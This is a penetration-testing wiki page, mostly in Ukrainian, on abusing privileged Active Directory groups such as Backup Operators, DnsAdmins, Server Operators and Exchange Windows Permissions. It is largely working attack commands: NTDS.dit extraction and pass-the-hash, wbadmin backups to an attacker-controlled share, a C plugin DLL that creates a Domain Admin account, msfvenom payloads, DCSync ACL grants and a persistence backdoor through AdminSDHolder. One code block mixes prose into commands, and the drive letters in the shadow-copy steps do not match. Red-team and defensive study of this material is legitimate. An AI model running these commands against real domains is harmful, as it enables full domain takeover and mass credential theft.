# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група має повноваження створювати облікові записи та групи, які не є адміністраторами в домені. Окрім того, вона дає змогу локального входу на контролер домену (DC).

Щоб визначити учасників цієї групи, виконується така команда:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Дозволено додавати нових користувачів, а також виконувати локальний вхід на DC.

## Група AdminSDHolder

Список керування доступом (Access Control List, ACL) групи **AdminSDHolder** має ключове значення, оскільки він встановлює дозволи для всіх «protected groups» в Active Directory, включно з групами високих привілеїв. Цей механізм забезпечує захист цих груп, перешкоджаючи несанкціонованим змінам.

Атакувальник може використати це, змінивши ACL групи **AdminSDHolder** та надавши звичайному користувачу повні права. Це фактично дасть цьому користувачу повний контроль над усіма protected groups. Якщо права цього користувача будуть змінені або видалені, вони будуть автоматично відновлені протягом години через особливість роботи системи.

Остання документація Windows Server досі розглядає кілька вбудованих груп операторів як об'єкти зі статусом **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, тощо). Процес **SDProp** запускається на **PDC Emulator** за замовчуванням що 60 хвилин, встановлює `adminCount=1` і відключає наслідування на protected objects. Це корисно як для persistence, так і для hunting за застарілими привілейованими обліковими записами, які були видалені з protected group, але все ще зберігають ACL без наслідування.

Команди для перегляду членів та зміни дозволів включають:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Скрипт доступний для прискорення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Для детальнішої інформації відвідайте [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Членство в цій групі дозволяє читати видалені об'єкти Active Directory, що може виявити конфіденційну інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Це корисно для **відновлення попередніх шляхів привілеїв**. Видалені об'єкти все ще можуть розкривати `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, старі SPNs, або DN видаленої привілейованої групи, яка пізніше може бути відновлена іншим оператором.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Доступ до контролера домену

Доступ до файлів на DC обмежений, якщо користувач не входить до групи `Server Operators`, що змінює рівень доступу.

### Підвищення привілеїв

За допомогою `PsService` або `sc` з Sysinternals можна переглянути та змінити дозволи служб. Група `Server Operators`, наприклад, має повний контроль над певними службами, що дозволяє виконувати довільні команди та підвищувати привілеї:
```cmd
C:\> .\PsService.exe security AppReadiness
```
This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.

## Оператори резервного копіювання

Членство в групі `Backup Operators` дає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють обходити папки, перелічувати їх і копіювати файли, навіть без явних дозволів, використовуючи прапор `FILE_FLAG_BACKUP_SEMANTICS`. Для цього необхідне використання спеціальних скриптів.

Щоб перерахувати учасників групи, виконайте:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Щоб використати ці привілеї локально, виконуються такі кроки:

1. Імпортуйте необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкнути та перевірити `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Отримати доступ і копіювати файли з обмежених директорій, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD атака

Прямий доступ до файлової системи Domain Controller дозволяє викрадення бази даних `NTDS.dit`, яка містить усі NTLM-хеші користувачів та комп'ютерів домену.

#### Використання diskshadow.exe

1. Створіть тіньову копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` із тіньової копії:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` і `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Після вилучення: Pass-the-Hash до DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Використання wbadmin.exe

1. Налаштуйте NTFS файлову систему для SMB-сервера на машині атакуючого та кешуйте SMB облікові дані на цільовій машині.
2. Використовуйте `wbadmin.exe` для резервного копіювання системи та витягання `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Для практичної демонстрації дивіться [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Члени групи **DnsAdmins** можуть використати свої привілеї для завантаження довільного DLL з правами SYSTEM на DNS-сервері, який часто розміщений на Domain Controllers. Ця можливість відкриває значний потенціал для експлуатації.

Щоб перелічити членів групи DnsAdmins, використайте:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дозволяє виконувати довільний код з привілеями SYSTEM у службі DNS (зазвичай всередині DCs). Проблему виправлено у 2021 році.

Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (який може вимагати додаткових дозволів) необхідний для завантаження DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для детальнішої інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll

Також можливо використовувати mimilib.dll для виконання команд, модифікуючи його для запуску конкретних команд або reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для додаткової інформації.

### WPAD запис для MitM

DnsAdmins можуть маніпулювати DNS-записами, щоб здійснювати Man-in-the-Middle (MitM) атаки, створюючи WPAD запис після відключення global query block list. Інструменти, такі як Responder або Inveigh, можна використовувати для spoofing та перехоплення мережевого трафіку.

### Event Log Readers
Члени можуть отримувати доступ до журналів подій, потенційно знаходячи чутливу інформацію, таку як паролі у відкритому вигляді або деталі виконання команд:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ця група може змінювати DACLs на доменному об'єкті, що потенційно може надати привілеї DCSync. Техніки ескалації привілеїв, що використовують цю групу, детально описані в Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Якщо ви можете діяти як учасник цієї групи, класичне зловживання — надати суб'єкту, контрольованому нападником, права реплікації, необхідні для [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Історично, **PrivExchange** зв'язував доступ до поштових скриньок, примусову аутентифікацію Exchange і LDAP relay, щоб досягти цього самого примітиву. Навіть коли цей шлях relay пом'якшено, пряме членство в `Exchange Windows Permissions` або контроль над Exchange server залишається високовартісним шляхом до прав реплікації домену.

## Hyper-V Administrators

Hyper-V Administrators мають повний доступ до Hyper-V, який можна використати для отримання контролю над віртуалізованими Domain Controllers. Це включає клонування живих DC і витяг NTLM хешів з файлу NTDS.dit.

### Приклад експлуатації

Практичне зловживання зазвичай полягає в **офлайн-доступі до дисків/контрольних точок DC** замість старих трюків host-level LPE. Маючи доступ до Hyper-V host, оператор може створити контрольну точку або експортнути віртуалізований Domain Controller, підмонтувати VHDX і витягти `NTDS.dit`, `SYSTEM`, та інші секрети, не торкаючись LSASS всередині guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Звідти повторно використайте робочий процес `Backup Operators`, щоб скопіювати `Windows\NTDS\ntds.dit` та registry hives офлайн.

## Group Policy Creators Owners

Ця група дозволяє її учасникам створювати Group Policies у домені. Однак її учасники не можуть застосовувати group policies до користувачів чи груп або редагувати існуючі GPOs.

Важливий нюанс полягає в тому, що **creator becomes owner of the new GPO** і зазвичай отримує достатньо прав для подальшого редагування. Це робить цю групу цікавою в ситуаціях, коли ви можете:

- create a malicious GPO and convince an admin to link it to a target OU/domain
- edit a GPO you created that is already linked somewhere useful
- abuse another delegated right that lets you link GPOs, while this group gives you the edit side

Практичне зловживання зазвичай означає додавання **Immediate Task**, **startup script**, **local admin membership**, або **user rights assignment** через SYSVOL-backed policy files.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Якщо редагувати GPO вручну через `SYSVOL`, пам'ятайте, що сама по собі така зміна недостатня: `versionNumber`, `GPT.ini` і іноді `gPCMachineExtensionNames` також потрібно оновити, інакше клієнти ігноруватимуть оновлення політики.

## Organization Management

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Organization Management**, має значні повноваження. Ця група має привілейований доступ до **поштових скриньок усіх користувачів домену** та має **повний контроль над OU 'Microsoft Exchange Security Groups'**. Цей контроль включає групу **`Exchange Windows Permissions`**, яку можна використати для підвищення привілеїв.

### Експлуатація привілеїв та команди

#### Print Operators

Члени групи **Print Operators** мають кілька привілеїв, зокрема **`SeLoadDriverPrivilege`**, який дозволяє їм **увійти локально до Domain Controller**, вимкнути його та керувати принтерами. Щоб використати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не відображається в непідвищеному контексті, необхідно обійти User Account Control (UAC).

Щоб перелічити учасників цієї групи, використовується така команда PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
На контролерах домену ця група небезпечна, оскільки стандартна політика контролера домену надає **`SeLoadDriverPrivilege`** групі `Print Operators`. Якщо ви отримаєте підвищений токен для члена цієї групи, ви можете увімкнути привілей і завантажити підписаний, але вразливий драйвер, щоб перейти в kernel/SYSTEM. Для деталей щодо обробки токенів див. [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Членам цієї групи надається доступ до ПК через Remote Desktop Protocol (RDP). Щоб перелічити цих членів, доступні команди PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості про експлуатацію RDP можна знайти в присвячених pentesting-ресурсах.

#### Користувачі віддаленого керування

Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування (enumeration) цих членів здійснюється за допомогою:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов'язаних з **WinRM**, слід звернутися до відповідної документації.

#### Оператори серверів

Ця група має права виконувати різні налаштування на контролерах домену, включно з правами резервного копіювання та відновлення, зміни системного часу та вимкнення системи. Щоб перерахувати членів, наведена команда:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
На контролерах домену `Server Operators` зазвичай успадковують достатні права, щоб **переналаштувати або запускати/зупиняти служби** і також отримують `SeBackupPrivilege`/`SeRestorePrivilege` через політику DC за замовчуванням. Фактично це робить їх містком між **service-control abuse** та **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Якщо ACL служби дає цій групі права змінювати/запускати сервіс, вкажіть сервіс на довільну команду, запустіть його як `LocalSystem`, а потім відновіть початковий `binPath`. Якщо керування сервісом заблоковано, поверніться до технік `Backup Operators`, наведених вище, щоб скопіювати `NTDS.dit`.

## Посилання <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
